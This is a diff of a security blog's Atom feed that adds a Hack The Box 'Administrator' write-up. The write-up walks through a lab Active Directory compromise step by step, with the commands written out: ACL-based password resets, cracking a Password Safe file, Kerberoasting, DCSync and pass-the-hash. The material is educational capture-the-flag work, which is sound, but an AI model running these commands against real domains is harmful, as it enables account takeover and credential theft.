@@ -1,4 +1,443 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-22T13:08:31+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Active</title><link href="http://localhost:4000/posts/active/" rel="alternate" type="text/html" title="Hack The Box: Active" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/active</id><content type="html" xml:base="http://localhost:4000/posts/active/"><![CDATA[<h1 id="htb-active--write-up">HTB Active — Write-up</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-23T01:07:18+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Administrator</title><link href="http://localhost:4000/posts/administrator/" rel="alternate" type="text/html" title="Hack The Box: Administrator" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/administrator</id><content type="html" xml:base="http://localhost:4000/posts/administrator/"><![CDATA[<h1 id="htb-administrator">HTB Administrator</h1>
+
+<h2 id="overview">Overview</h2>
+
+<p><strong>Target:</strong> Administrator<br />
+<strong>Platform:</strong> Hack The Box<br />
+<strong>Operating System:</strong> Windows<br />
+<strong>Domain:</strong> <code class="language-plaintext highlighter-rouge">administrator.htb</code><br />
+<strong>Starting Credentials:</strong> <code class="language-plaintext highlighter-rouge">olivia : ichliebedich</code></p>
+
+<p>Administrator is a Grey Box Active Directory machine. We are given initial credentials for Olivia, allowing us to authenticate to the domain and begin enumerating Active Directory.</p>
+
+<h2 id="1-initial-enumeration">1. Initial Enumeration</h2>
+
+<p>Start with an Nmap scan to identify exposed services.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sC -sV 10.129.8.62 --min-rate 1000
+</code></pre></div></div>
+
+<p>The important results are:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Significance</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>21</td>
+      <td>FTP</td>
+      <td>File access and potential credential-dependent resources</td>
+    </tr>
+    <tr>
+      <td>53</td>
+      <td>DNS</td>
+      <td>Domain name resolution</td>
+    </tr>
+    <tr>
+      <td>88</td>
+      <td>Kerberos</td>
+      <td>Active Directory authentication</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Windows RPC</td>
+    </tr>
+    <tr>
+      <td>139, 445</td>
+      <td>NetBIOS/SMB</td>
+      <td>Windows networking and file sharing</td>
+    </tr>
+    <tr>
+      <td>389</td>
+      <td>LDAP</td>
+      <td>Active Directory queries</td>
+    </tr>
+    <tr>
+      <td>464</td>
+      <td>Kerberos password service</td>
+      <td>Password operations</td>
+    </tr>
+    <tr>
+      <td>3268</td>
+      <td>LDAP Global Catalog</td>
+      <td>Forest-wide directory searches</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>WinRM</td>
+      <td>Remote Windows management</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The LDAP service identifies the domain as <code class="language-plaintext highlighter-rouge">administrator.htb</code>. The host is a Windows domain controller, making Active Directory enumeration the primary focus.</p>
+
+<p>We also have initial credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: Olivia
+Password: ichliebedich
+</code></pre></div></div>
+
+<h2 id="2-gaining-a-remote-session">2. Gaining a Remote Session</h2>
+
+<p>Use Evil-WinRM to authenticate with the supplied credentials.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i 10.129.8.62 -u olivia -p 'ichliebedich'
+</code></pre></div></div>
+
+<p>Once connected, transfer and execute SharpHound to collect Active Directory information.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\SharpHound.exe
+</code></pre></div></div>
+
+<p>Download the resulting ZIP archive to Kali:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download .\20261022104836_BloodHound.zip
+</code></pre></div></div>
+
+<p>Import the archive into BloodHound and inspect Olivia’s outbound object-control relationships.</p>
+
+<p><img src="/assets/images/administrator_olivia_to_michael.png" alt="BloodHound showing the service account's outbound privilege relationship" /></p>
+
+<p>The graph reveals that Olivia has <code class="language-plaintext highlighter-rouge">GenericAll</code> over Michael’s user object.</p>
+
+<p>This is our first opportunity for privilege escalation.</p>
+
+<hr />
+
+<h2 id="3-olivia--michael-abusing-genericall">3. Olivia → Michael: Abusing GenericAll</h2>
+
+<h3 id="understanding-genericall">Understanding GenericAll</h3>
+
+<p><code class="language-plaintext highlighter-rouge">GenericAll</code> represents broad control over an AD object. When applied to a user object, it can allow an attacker to modify attributes and perform operations such as resetting the user’s password, subject to the object’s security configuration.</p>
+
+<p>Because Olivia has <code class="language-plaintext highlighter-rouge">GenericAll</code> over Michael, we can reset Michael’s password and authenticate as him.</p>
+
+<p>Use BloodyAD:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyad -H administrator.htb \
+  -u olivia -p 'ichliebedich' \
+  set password michael 'password'
+</code></pre></div></div>
+
+<p>Expected result:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Password changed successfully!
+</code></pre></div></div>
+
+<p>We now have credentials for Michael:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: michael
+Password: password
+</code></pre></div></div>
+
+<p>The password shown here is the value used in the lab commands. In a real environment, a password reset should use a strong, unique value.</p>
+
+<hr />
+
+<h2 id="4-michael--benjamin-forcechangepassword">4. Michael → Benjamin: ForceChangePassword</h2>
+
+<p>Further inspection of BloodHound reveals that Michael has <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> rights over Benjamin.</p>
+
+<p><img src="/assets/images/administrator_michael_to_benjamin.png" alt="BloodHound showing the account's outbound privilege relationship" /></p>
+
+<p>This permission allows Michael to reset Benjamin’s password without knowing Benjamin’s existing password.</p>
+
+<p>Run:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyad -H administrator.htb \
+  -u michael -p 'password' \
+  set password benjamin 'password'
+</code></pre></div></div>
+
+<p>Expected result:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Password changed successfully!
+</code></pre></div></div>
+
+<p>We now have a second account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: benjamin
+Password: password
+</code></pre></div></div>
+
+<p>This is a straightforward example of ACL chaining: Olivia controls Michael, and Michael controls Benjamin. Neither relationship needs to grant domain-wide administrative privileges on its own.</p>
+
+<hr />
+
+<h2 id="5-benjamin--password-safe-database">5. Benjamin → Password Safe Database</h2>
+
+<p>The Nmap scan revealed FTP on port 21. Authenticate using Benjamin’s credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.129.8.62
+</code></pre></div></div>
+
+<p>At the prompts, enter:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name: benjamin
+Password: password
+</code></pre></div></div>
+
+<p>List the files:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; ls
+</code></pre></div></div>
+
+<p>The server exposes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Backup.psafe3
+</code></pre></div></div>
+
+<p>Download the file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; binary
+ftp&gt; get Backup.psafe3
+</code></pre></div></div>
+
+<p><strong>Why binary mode?</strong> <code class="language-plaintext highlighter-rouge">Backup.psafe3</code> is a binary Password Safe database. Using FTP’s default ASCII mode can modify line endings or otherwise corrupt a transferred file. Binary mode preserves the original bytes.</p>
+
+<h3 id="extracting-the-password-hash">Extracting the password hash</h3>
+
+<p>Password Safe protects its database with a master password. We can extract the database’s password-verification material for offline cracking with John the Ripper.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwsafe2john Backup.psafe3 &gt; pwsafe.hash
+</code></pre></div></div>
+
+<p>The resulting hash begins with a structure similar to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Backu:$pwsafe$*3*...
+</code></pre></div></div>
+
+<p>The extracted value is not the plaintext password. It is data that a password-cracking tool can use to verify candidate passwords.</p>
+
+<h3 id="cracking-the-master-password">Cracking the master password</h3>
+
+<p>Run John against the RockYou wordlist:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john pwsafe.hash \
+  --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>John recovers master password</p>
+
+<p>We now have the master password needed to open the Password Safe database.</p>
+
+<h3 id="inspecting-the-database">Inspecting the database</h3>
+
+<p>Open <code class="language-plaintext highlighter-rouge">Backup.psafe3</code> in a compatible Password Safe client and enter the recovered master password.</p>
+
+<p><img src="/assets/images/administrator_passsafe.png" alt="passsafe locker image" />
+Inspect the saved entries for additional credentials.</p>
+
+<hr />
+
+<h2 id="6-emily--ethan-making-the-account-kerberoastable">6. Emily → Ethan: Making the Account Kerberoastable</h2>
+
+<p>After recovering Emily’s credentials, return to BloodHound and inspect her object-control relationships.</p>
+
+<p><img src="/assets/images/administrator_emily_to_ethan.png" alt="BloodHound showing the account's outbound privilege relationship" /></p>
+
+<p>Emily has write permission over Ethan’s account. This enables modification of attributes on Ethan’s user object, including the <code class="language-plaintext highlighter-rouge">servicePrincipalName</code> attribute in this lab.</p>
+
+<p>An account with an SPN can be targeted for Kerberoasting when the relevant conditions are met. Normally, an SPN identifies a service associated with an account. If an account lacks an SPN, an attacker with sufficient write permissions may be able to assign one and then request a service ticket for that account.</p>
+
+<p>Set an SPN on Ethan:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyad -H administrator.htb \
+  -u emily -p '&lt;REDACTED&gt;' \
+  set object ethan servicePrincipalName \
+  -v 'hackthebox/ethan.account'
+</code></pre></div></div>
+
+<p>Expected output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] ethan's servicePrincipalName has been updated
+</code></pre></div></div>
+
+<p>The SPN <code class="language-plaintext highlighter-rouge">hackthebox/ethan.account</code> is a chosen service identifier. Its purpose here is to associate an SPN with Ethan so that a service ticket can be requested for the account.</p>
+
+<p><strong>Important:</strong> This technique depends on Emily’s actual write permissions over Ethan’s object and the domain accepting the attribute change. It is not a universal requirement to create a new SPN for every Kerberoasting attack.</p>
+
+<hr />
+
+<h2 id="7-kerberoasting-ethan">7. Kerberoasting Ethan</h2>
+
+<p>With an SPN configured, request Kerberos service tickets using Impacket’s <code class="language-plaintext highlighter-rouge">GetUserSPNs</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs administrator.htb/emily -request
+</code></pre></div></div>
+
+<p>Enter Emily’s password when prompted.</p>
+
+<p>The output identifies Ethan:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ServicePrincipalName      Name
+------------------------  ----
+hackthebox/ethan.account  ethan
+</code></pre></div></div>
+
+<p>Impacket returns a TGS hash in <code class="language-plaintext highlighter-rouge">$krb5tgs$23$...</code> format.</p>
+
+<p>This is a Kerberos 5 TGS-REP etype 23 ticket hash, which is compatible with Hashcat mode <code class="language-plaintext highlighter-rouge">13100</code>.</p>
+
+<p>Save the complete hash to <code class="language-plaintext highlighter-rouge">hash.txt</code>, then run:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 13100 hash.txt \
+  /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>We now have Ethan’s credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: ethan
+Password: &lt;REDACTED&gt;
+</code></pre></div></div>
+
+<h3 id="why-the-attack-works">Why the attack works</h3>
+
+<p>Kerberoasting does not require the attacker to know the service account’s password. A domain user can request a service ticket for an account with an SPN, and the ticket contains material that can be attacked offline.</p>
+
+<p>The security impact depends heavily on the account’s password strength. A weak password allows an attacker to recover the account secret without repeatedly guessing passwords against the domain controller.</p>
+
+<p>In this case, the password is recovered and the next step is to inspect Ethan’s effective privileges.</p>
+
+<hr />
+
+<h2 id="8-ethan--domain-compromise-dcsync">8. Ethan → Domain Compromise: DCSync</h2>
+
+<p>BloodHound reveals that Ethan has replication-related rights over the <code class="language-plaintext highlighter-rouge">administrator.htb</code> domain, including the DCSync capability.
+<img src="/assets/images/administrator_ethan_to_administrator.png" alt="BloodHound showing the account's outbound privilege relationship" /></p>
+
+<p>DCSync abuses Active Directory replication permissions to request password data from a domain controller through directory replication protocols. It does not require reading the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file directly from disk.</p>
+
+<p>The relevant rights commonly include:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes-All</code></p>
+  </li>
+</ul>
+
+<p>Depending on the domain and operation, additional replication rights may also appear in the graph.</p>
+
+<p>The critical issue is that Ethan has sufficient replication permissions to retrieve sensitive credential material for the domain’s Administrator account.</p>
+
+<h3 id="dump-the-administrator-credentials">Dump the Administrator credentials</h3>
+
+<p>Use Impacket’s <code class="language-plaintext highlighter-rouge">secretsdump</code> and request only the Administrator account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump \
+  administrator.htb/ethan:limpbizkit@10.129.8.62 \
+  -just-dc-user administrator \
+  -dc-ip 10.129.8.62
+</code></pre></div></div>
+
+<p>The output includes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator:500:&lt;REDACTED&gt;:&lt;REDACTED&gt;:::
+</code></pre></div></div>
+
+<p>Ethan’s replication rights allow us to retrieve the Administrator’s credential material directly, avoiding the need to crack the Administrator’s password.</p>
+
+<hr />
+
+<h2 id="9-pass-the-hash-with-evil-winrm">9. Pass the Hash with Evil-WinRM</h2>
+
+<p>Instead of cracking the recovered NT hash, use it to authenticate with Evil-WinRM.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i 10.129.8.62 \
+  -u administrator \
+  -H &lt;REDACTED&gt;
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">-H</code> option supplies the NT hash for pass-the-hash authentication.</p>
+
+<p>Once authenticated, navigate to the Administrator Desktop:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\Users\Administrator\Desktop
+ls
+</code></pre></div></div>
+
+<p>The directory contains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root.txt
+</code></pre></div></div>
+
+<p>Retrieve the flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat root.txt
+</code></pre></div></div>
+
+<p>This completes the machine.</p>
+
+<hr />
+
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Stage</th>
+      <th>Technique</th>
+      <th>Result</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>Initial credentials</td>
+      <td>Remote session as Olivia</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td><code class="language-plaintext highlighter-rouge">GenericAll</code> ACL abuse</td>
+      <td>Reset Michael’s password</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td><code class="language-plaintext highlighter-rouge">ForceChangePassword</code></td>
+      <td>Reset Benjamin’s password</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>FTP enumeration</td>
+      <td>Download <code class="language-plaintext highlighter-rouge">Backup.psafe3</code></td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>Offline password cracking</td>
+      <td>Recover Password Safe master password</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>Write permission over Ethan</td>
+      <td>Add an SPN</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>Kerberoasting</td>
+      <td>Recover Ethan’s password</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>DCSync</td>
+      <td>Retrieve Administrator’s NT hash</td>
+    </tr>
+    <tr>
+      <td>9</td>
+      <td>Pass the hash</td>
+      <td>Authenticate as Administrator</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="BloodHound" /><category term="FTP" /><category term="Password Safe" /><category term="Kerberoasting" /><category term="Active Directory" /><summary type="html"><![CDATA[HTB Administrator]]></summary></entry><entry><title type="html">Hack The Box: Active</title><link href="http://localhost:4000/posts/active/" rel="alternate" type="text/html" title="Hack The Box: Active" /><published>2026-10-22T00:00:00+05:30</published><updated>2026-10-22T00:00:00+05:30</updated><id>http://localhost:4000/posts/active</id><content type="html" xml:base="http://localhost:4000/posts/active/"><![CDATA[<h1 id="htb-active">HTB Active</h1>
 
 <p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.52</code><br />
 <strong>Domain:</strong> <code class="language-plaintext highlighter-rouge">active.htb</code><br />
@@ -303,7 +742,7 @@ Authenticate to SMB as Administrator
         |
         v
 Retrieve root.txt
-</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="Active Directory" /><category term="kerberoasting" /><category term="SMB Enumeration" /><category term="GPP" /><summary type="html"><![CDATA[HTB Active — Write-up]]></summary></entry><entry><title type="html">Hack The Box: Forest</title><link href="http://localhost:4000/posts/forest/" rel="alternate" type="text/html" title="Hack The Box: Forest" /><published>2026-10-21T00:00:00+05:30</published><updated>2026-10-21T00:00:00+05:30</updated><id>http://localhost:4000/posts/forest</id><content type="html" xml:base="http://localhost:4000/posts/forest/"><![CDATA[<h1 id="hack-the-box-forest--write-up">Hack The Box Forest — Write-Up</h1>
+</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="Active Directory" /><category term="Kerberoasting" /><category term="SMB Enumeration" /><category term="GPP" /><summary type="html"><![CDATA[HTB Active]]></summary></entry><entry><title type="html">Hack The Box: Forest</title><link href="http://localhost:4000/posts/forest/" rel="alternate" type="text/html" title="Hack The Box: Forest" /><published>2026-10-21T00:00:00+05:30</published><updated>2026-10-21T00:00:00+05:30</updated><id>http://localhost:4000/posts/forest</id><content type="html" xml:base="http://localhost:4000/posts/forest/"><![CDATA[<h1 id="htb-forest">HTB Forest</h1>
 
 <h2 id="overview">Overview</h2>
 
@@ -580,4 +1019,4 @@ Retrieve the Administrator NTLM hash
 WinRM as Administrator
         ↓
 Root flag
-</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="as-rep-roasting" /><category term="bloodhound" /><category term="dcsync" /><category term="Active Directory" /><summary type="html"><![CDATA[Hack The Box Forest — Write-Up]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="active-directory" /><category term="windows" /><category term="as-rep-roasting" /><category term="BloodHound" /><category term="Active Directory" /><summary type="html"><![CDATA[HTB Forest]]></summary></entry></feed>
